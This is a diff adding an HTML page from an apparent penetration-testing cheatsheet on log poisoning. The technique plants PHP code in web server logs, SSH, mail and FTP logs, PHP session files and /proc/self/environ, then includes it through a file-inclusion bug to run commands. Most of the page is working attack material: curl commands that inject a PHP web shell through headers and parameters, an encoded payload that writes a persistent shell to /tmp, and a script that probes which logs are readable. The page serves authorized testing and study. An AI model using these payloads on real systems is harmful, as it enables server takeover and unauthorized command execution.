@@ -1,0 +1,237 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Log poisoning · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › File Inclusion</nav><h1>Log poisoning</h1><p class="cx-lede">Writing PHP code into server logs (User-Agent, error logs, SSH/FTP/mail logs) and PHP session files, then including those logs via LFI for RCE.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1059, T1027</span><span class="cx-tag">D3FEND D3-EAL, D3-FA</span><span class="cx-tag">IMPACT ServerSideEval, RCE</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Get attacker-controlled data into a server-side log file, then include the log via LFI. The PHP code in the log entry executes when included.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Poison Apache/Nginx access log via User-Agent header
+curl -A &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; https://target/
+
+# Include the log
+?page=/var/log/nginx/access.log&amp;cmd=id
+
+# Poison PHP session - set the session value to PHP code
+?page=&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;          # value goes into the session file
+?page=/var/lib/php/sessions/sess_&lt;PHPSESSID&gt;&amp;cmd=id   # then include the session
+
+# Other log sources
+?page=/var/log/auth.log&amp;cmd=id                # SSH attempts log User-Agent-equivalents
+?page=/var/log/mail.log&amp;cmd=id                # mail server can be poisoned via crafted emails
+?page=/var/log/vsftpd.log&amp;cmd=id              # FTP login attempts
+?page=/proc/self/environ&amp;cmd=id               # environment variables - Linux /proc</code></pre></figure>
+<p>Success indicator: command output in the response after including the poisoned log.</p>
+<h2 id="when-this-is-the-right-approach">When this is the right approach</h2>
+<p>Log poisoning is the fallback when:</p>
+<ul>
+<li><strong>Wrappers are blocked</strong> - <code>data://</code>, <code>php://input</code> filtered or <code>allow_url_include = Off</code></li>
+<li><strong>No upload feature</strong> - can't use the <a href="../file-upload-chain/index.html">file-upload chain</a></li>
+<li><strong><code>expect://</code> not installed</strong></li>
+<li><strong>Outbound network blocked</strong> - can't <a href="../rfi/index.html">RFI</a></li>
+</ul>
+<p>What you need:</p>
+<ol>
+<li>LFI that <strong>executes</strong> included files</li>
+<li>A log or session file that <strong>records something you control</strong></li>
+<li><strong>Read access to that log</strong> via the LFI</li>
+</ol>
+<p>The third requirement is the often-overlooked gate. Apache logs are root-readable; Nginx logs are usually <code>www-data</code>-readable. Check before committing.</p>
+<h2 id="pattern-1-apache-nginx-access-log">Pattern 1 - Apache / Nginx access log</h2>
+<p>The access log records HTTP requests with several attacker-controllable fields. The <code>User-Agent</code> is the cleanest:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>192.168.1.10 - - [11/May/2026:20:00:00 +0000] &quot;GET / HTTP/1.1&quot; 200 1234 &quot;-&quot; &quot;&lt;USER_AGENT&gt;&quot;
+                                                                              └─── attacker control ───┘</code></pre></figure>
+<h3 id="step-1-identify-the-log-path">Step 1 - Identify the log path</h3>
+<p>Common paths:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Apache
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/httpd/access_log              # RHEL/CentOS
+/var/log/httpd/error_log
+
+# Nginx
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+
+# Custom / framework-specific
+/var/log/&lt;appname&gt;/access.log
+/opt/&lt;appname&gt;/logs/access.log</code></pre></figure>
+<p>When unknown, read the web server config to find the log directive:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf
+?page=php://filter/convert.base64-encode/resource=/etc/nginx/nginx.conf</code></pre></figure>
+<p>Look for <code>CustomLog</code>, <code>ErrorLog</code>, <code>access_log</code>, <code>error_log</code> directives.</p>
+<h3 id="step-2-confirm-read-access">Step 2 - Confirm read access</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=/var/log/nginx/access.log</code></pre></figure>
+<p>If you see log content, read access works. If you see an error or empty response, read is blocked - most often because Apache logs are restricted to <code>root</code>/<code>adm</code>.</p>
+<h3 id="step-3-poison-the-log">Step 3 - Poison the log</h3>
+<p>Set the <code>User-Agent</code> to PHP code in any request to the target:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl -A &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; https://target/</code></pre></figure>
+<p>The access log now contains:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>192.168.1.10 - - [11/May/2026:20:00:30 +0000] &quot;GET / HTTP/1.1&quot; 200 1234 &quot;-&quot; &quot;&lt;?php system($_GET[\&quot;cmd\&quot;]); ?&gt;&quot;</code></pre></figure>
+<h3 id="step-4-include-and-execute">Step 4 - Include and execute</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=/var/log/nginx/access.log&amp;cmd=id</code></pre></figure>
+<p>PHP parses the entire log file looking for <code>&lt;?php ... ?&gt;</code> blocks. When it hits the poisoned line, it executes <code>system($_GET["cmd"])</code> with <code>cmd=id</code>. The output appears in the response.</p>
+<p>Result:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre></figure>
+<h3 id="caveats">Caveats</h3>
+<ul>
+<li><strong>Log size.</strong> Production access logs are huge. Including a 200MB log via LFI is slow and may time out or crash the server. Mitigate by testing on lab apps with small logs; in production, log poisoning is a known-loud and known-fragile path.</li>
+<li><strong>Quote escaping.</strong> Some log formats HTML-escape the User-Agent before writing. <code>&lt;</code> becomes <code>&amp;lt;</code>, breaking PHP parsing. Test the log entry after one poisoning request and verify the <code>&lt;?php</code> is unencoded.</li>
+<li><strong>Multi-request escalation.</strong> Each command requires the log to contain the poisoning payload at execution time. The log accumulates - your first poisoning persists, so subsequent commands just re-include the log with a different <code>cmd=</code>.</li>
+</ul>
+<h2 id="pattern-2-error-log">Pattern 2 - Error log</h2>
+<p>Same as access log but writes when requests fail:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=/var/log/nginx/error.log</code></pre></figure>
+<p>Error logs are sometimes more readable than access logs (different default permissions) and frequently smaller. To poison:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Force an error containing your User-Agent or other controllable field
+curl -A &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; https://target/nonexistent-path</code></pre></figure>
+<p>The 404 generates an error log entry containing the User-Agent. Same inclusion pattern as access log.</p>
+<h3 id="specific-error-log-poisoning-vectors">Specific error-log poisoning vectors</h3>
+<p>Beyond User-Agent, error logs sometimes record:</p>
+<ul>
+<li><strong>Referer header</strong> - when a referrer-based check fails</li>
+<li><strong>Request URI</strong> - when a path with special characters causes a parse error</li>
+<li><strong>Authentication failures</strong> - username from Basic Auth attempts:</li>
+</ul>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># The Authorization header reveals the username on auth failure
+curl -u &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;:anything&#x27; https://target/protected</code></pre></figure>
+<p>The error log records: <code>user 'shellpayload' authentication failure for /protected</code>.</p>
+<h2 id="pattern-3-php-session-file">Pattern 3 - PHP session file</h2>
+<p>PHP stores session data in files on disk, named after the <code>PHPSESSID</code> cookie:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>/var/lib/php/sessions/sess_&lt;PHPSESSID&gt;           # Linux default
+C:\Windows\Temp\sess_&lt;PHPSESSID&gt;                  # Windows default</code></pre></figure>
+<p>The file contents are a serialized PHP structure with whatever session variables the application set. If the application sets a session value from user input, you can poison the session.</p>
+<h3 id="step-1-find-the-session-file-path">Step 1 - Find the session file path</h3>
+<p>The <code>PHPSESSID</code> cookie in your browser tells you the filename:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Cookie: PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd
+                  ↓
+       /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code></pre></figure>
+<h3 id="step-2-identify-a-session-stored-field">Step 2 - Identify a session-stored field</h3>
+<p>Include the session file and see what's in it:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code></pre></figure>
+<p>A typical output:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>page|s:6:&quot;es.php&quot;;preference|s:7:&quot;english&quot;;</code></pre></figure>
+<p>Each <code>name|s:N:"value";</code> is a session variable. The <code>name</code> is set by the application; the <code>value</code> came from somewhere.</p>
+<p>Determine which session variables you can control. Common candidates:</p>
+<ul>
+<li><strong>Last visited page</strong> (often the <code>?page=</code> parameter itself - a perfect self-poisoning loop)</li>
+<li><strong>Language preference</strong></li>
+<li><strong>Theme</strong></li>
+<li><strong>Search query</strong></li>
+<li><strong>Recently viewed items</strong></li>
+</ul>
+<h3 id="step-3-poison-the-session">Step 3 - Poison the session</h3>
+<p>Set the controlled value to PHP code. If the <code>page</code> value is stored in the session:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl &#x27;https://target/?page=&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; \
+     -b &#x27;PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd&#x27;</code></pre></figure>
+<p>URL-encoded:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl &#x27;https://target/?page=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E&#x27; \
+     -b &#x27;PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd&#x27;</code></pre></figure>
+<p>Now the session file contains:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>page|s:30:&quot;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&quot;;preference|s:7:&quot;english&quot;;</code></pre></figure>
+<h3 id="step-4-include-the-session">Step 4 - Include the session</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id</code></pre></figure>
+<p>PHP parses the file, hits the <code>&lt;?php ... ?&gt;</code> block inside the session value, executes.</p>
+<h3 id="caveats_1">Caveats</h3>
+<ul>
+<li><strong>The session file is overwritten on every request.</strong> When you include the session via LFI, the application processes your request normally - which updates the session, replacing the poisoned <code>page</code> value with <code>/var/lib/php/sessions/sess_xxx</code>. Subsequent inclusions see the LFI path inside the session value, not your shell.</li>
+</ul>
+<p>Mitigation: re-poison before each include. Or chain to a persistent shell:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Use the first execution to write a permanent shell
+curl &#x27;https://target/?page=%3C%3Fphp%20file_put_contents%28%22%2Ftmp%2Fx%22%2C%22%3C%3Fphp%20system%28%5C%24_GET%5B%5C%22c%5C%22%5D%29%3B%20%3F%3E%22%29%3B%20%3F%3E&#x27; \
+     -b &#x27;PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd&#x27;
+
+# Now include /tmp/x for all future commands (no re-poisoning needed)
+curl &#x27;https://target/?page=/tmp/x&amp;c=id&#x27;</code></pre></figure>
+<ul>
+<li><strong>Session permissions.</strong> PHP session files are typically owned by <code>www-data</code> with <code>600</code> permissions - accessible to the web app itself (which the LFI runs in) but not the operator directly. The LFI's read access is what makes inclusion possible.</li>
+</ul>
+<h2 id="pattern-4-procselfenviron-linux">Pattern 4 - <code>/proc/self/environ</code> (Linux)</h2>
+<p>Linux exposes process environment variables via <code>/proc/&lt;pid&gt;/environ</code>. The current process is accessible as <code>/proc/self/environ</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=/proc/self/environ</code></pre></figure>
+<p>The file's content is a null-separated list of environment variables - including <code>HTTP_USER_AGENT</code>, which the web server set from your request:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>USER=www-data\0HTTP_USER_AGENT=&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;\0PATH=/usr/bin:/bin\0...</code></pre></figure>
+<p>Poison by setting User-Agent in a single request and including <code>/proc/self/environ</code> in the same request (or the next):</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl -A &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; \
+     &#x27;https://target/?page=/proc/self/environ&amp;cmd=id&#x27;</code></pre></figure>
+<h3 id="procselffdn-open-file-descriptors"><code>/proc/self/fd/N</code> - open file descriptors</h3>
+<p><code>/proc/self/fd/</code> holds a symlink to every file the process has open, numbered by descriptor. When an application-level filter blocks the log's <em>filename</em> but the web process holds that log open, the descriptor is another way to name the same file:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=/proc/self/fd/N&amp;cmd=id     # N = descriptor number, usually in 0-50</code></pre></figure>
+<p>The number isn't predictable, so sweep the low range (0-50). This is a way around a <em>filename</em> filter, <strong>not</strong> a runtime restriction: PHP resolves the symlink and re-checks <code>open_basedir</code> and the target file's own permissions against the real path, so a descriptor pointing at a forbidden file is still denied.</p>
+<h3 id="caveats_2">Caveats</h3>
+<ul>
+<li><strong>Linux only</strong> - <code>/proc</code> is Linux-specific. Windows targets don't have this file.</li>
+<li><strong>Permission restrictions</strong> - <code>/proc/self/environ</code> is readable to the process owner. The web app reads its own environ fine. But under PHP-FPM or with <code>open_basedir</code> restrictions, the read may fail.</li>
+<li><strong>PID variability</strong> - <code>/proc/self/</code> always points to the current process. <code>/proc/&lt;NUMBER&gt;/environ</code> for other processes works if accessible, but the PID varies.</li>
+</ul>
+<h2 id="pattern-5-ssh-log">Pattern 5 - SSH log</h2>
+<p>When <code>sshd</code> logs login attempts, the attempted <em>username</em> is recorded. A malformed username containing PHP poisons the log:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Attempt SSH login with PHP as the username
+ssh &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;@target.example.com
+# Type any password; it fails; the username is logged</code></pre></figure>
+<p>The auth log records:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>May 11 20:00:30 target sshd[1234]: Failed password for invalid user &lt;?php system($_GET[&quot;cmd&quot;]); ?&gt; from 192.168.1.10 port 5555 ssh2</code></pre></figure>
+<p>Include:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=/var/log/auth.log&amp;cmd=id</code></pre></figure>
+<h3 id="caveats_3">Caveats</h3>
+<ul>
+<li><strong><code>/var/log/auth.log</code> is usually root-readable only.</strong> LFI as <code>www-data</code> typically can't read it. Check before relying on this.</li>
+<li><strong>Shell quoting.</strong> The SSH client may reject usernames with <code>&lt;</code>, <code>&gt;</code>, <code>?</code>, and shell metacharacters. Quote carefully or escape via base64 + decode wrapper:</li>
+</ul>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">ssh &quot;$(echo PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+ | base64 -d)&quot;@target</code></pre></figure>
+<p>(The base64 trick doesn't actually help here because the shell-quoting issue is in the SSH client's username field, not the bash command. Direct quoting with single quotes usually works.)</p>
+<h2 id="pattern-6-mail-log">Pattern 6 - Mail log</h2>
+<p>When the application sends emails (registration confirmation, password reset), the mail logs record sender/recipient addresses:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=/var/log/mail.log</code></pre></figure>
+<p>Poisoning: trigger a feature that emails to an attacker-supplied address, set the address to PHP code:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>attacker.com&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;</code></pre></figure>
+<p>Most mail systems will reject this as malformed - but the <em>attempt</em> may still be logged before rejection.</p>
+<h3 id="caveats_4">Caveats</h3>
+<ul>
+<li>Highly variable based on mail configuration. Some logs contain the malformed address; others sanitize. Test.</li>
+<li><code>/var/log/mail.log</code> is also typically root-readable. The LFI-as-<code>www-data</code> reach is limited.</li>
+</ul>
+<h2 id="pattern-7-ftp-log">Pattern 7 - FTP log</h2>
+<p>If the target runs an FTP service (vsftpd, ProFTPD), login attempts are logged with the attempted username:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=/var/log/vsftpd.log</code></pre></figure>
+<p>Poison via attempted FTP login with PHP as the username. Similar to SSH log poisoning, the log file's read permissions are the gating factor.</p>
+<h2 id="combining-patterns">Combining patterns</h2>
+<p>A real engagement chains: confirm LFI, identify which logs/sessions are readable, poison the most accessible one, include.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># 1. Confirm LFI
+curl &#x27;https://target/?page=/etc/passwd&#x27;
+
+# 2. Check log readability
+for log in /var/log/nginx/access.log /var/log/apache2/access.log /var/log/auth.log /proc/self/environ; do
+    response=$(curl -s &quot;https://target/?page=$log&quot;)
+    if [ -n &quot;$response&quot; ]; then
+        echo &quot;[+] Readable: $log&quot;
+    fi
+done
+
+# 3. Poison the readable log via the cheapest channel
+curl -A &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; https://target/
+
+# 4. Include
+curl &quot;https://target/?page=/var/log/nginx/access.log&amp;cmd=id&quot;</code></pre></figure>
+<h2 id="detection-only-payloads">Detection-only payloads</h2>
+<p>Confirm log inclusion works without committing to a poisoning attack:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Just include a log and verify it has content
+curl &quot;https://target/?page=/var/log/nginx/access.log&quot; | head -c 500
+
+# Confirm User-Agent appears in the log
+curl -A &quot;MY_UNIQUE_PROBE_$(date +%s)&quot; https://target/
+sleep 1
+curl &quot;https://target/?page=/var/log/nginx/access.log&quot; | grep MY_UNIQUE_PROBE</code></pre></figure>
+<p>If the probe string appears in the log inclusion response, poisoning is technically feasible - though execution still depends on the LFI sink executing PHP.</p>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong>Log poisoning is loud.</strong> Each poisoning attempt writes to logs that defenders monitor. Successful exploitation leaves a clear trace. Unlike wrapper-based RCE, this attack is <em>guaranteed</em> to generate audit-log entries - both the poisoning request and the inclusion.</li>
+<li><strong>The log might be rotated.</strong> When you include the log to execute the poisoned payload, the log might already have rotated (<code>access.log.1</code>, <code>access.log.gz</code>). Include the rotated version, or re-poison and include immediately.</li>
+<li><strong>Pre-existing log entries may also contain executable content.</strong> If a previous tester or operator poisoned the log and didn't clean up, the log might already contain <code>&lt;?php ... ?&gt;</code> blocks. An LFI inclusion of the log "just works" without explicit poisoning. Worth checking before assuming the log needs poisoning.</li>
+<li><strong><code>open_basedir</code> may block <code>/var/log/</code> access.</strong> Even when the log is technically readable to <code>www-data</code>, a PHP-side <code>open_basedir = /var/www</code> restriction prevents PHP from reading outside that tree. Check the PHP config first.</li>
+</ul>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>Log poisoning generates the most audit-log evidence of any LFI exploitation path. The poisoning entry and the inclusion entry both name the attacker IP. This is one of the loudest forms of LFI exploitation - only use when other paths are unavailable or when the engagement scope explicitly tolerates noise.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../file-upload-chain/index.html">Previous: File-upload chain</a><a class="cx-next" href="../enumeration/index.html">Next: Enumeration</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
